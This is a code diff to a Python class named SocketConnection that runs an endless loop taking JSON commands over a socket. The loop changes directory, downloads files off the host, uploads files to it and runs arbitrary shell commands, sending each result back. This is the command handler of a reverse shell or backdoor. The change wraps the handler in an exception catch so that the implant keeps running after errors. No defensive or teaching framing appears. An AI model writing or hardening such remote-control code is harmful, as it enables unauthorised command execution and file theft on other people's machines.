@@ -53,17 +53,21 @@ class SocketConnection:
     def start_socket(self):
         while True: # Create infinite loop of execution of commands
             command = self.json_receive()
-            if command[0] == "exit":
-               self.connection.close()
-               exit()
-            elif command[0] == "cd" and len(command) > 1:
-                command_output = self.cd_command(command[1])
-            elif command[0] == "download":
-                command_output = self.getting_file_contents(command[1])
-            elif command[0] == "upload":
-                command_output = self.save_file(command[1],command[2])
-            else:
-                command_output = self.command_execution(command).decode()
+            try:
+                if command[0] == "exit":
+                   self.connection.close()
+                   exit()
+                elif command[0] == "cd" and len(command) > 1:
+                    command_output = self.cd_command(command[1])
+                elif command[0] == "download":
+                    command_output = self.getting_file_contents(command[1])
+                elif command[0] == "upload":
+                    command_output = self.save_file(command[1],command[2])
+                else:
+                    command_output = self.command_execution(command).decode()
+            except Exception:
+                    command_output = "Error!!"
+
             self.json_send(command_output)
         self.connection.close()
 
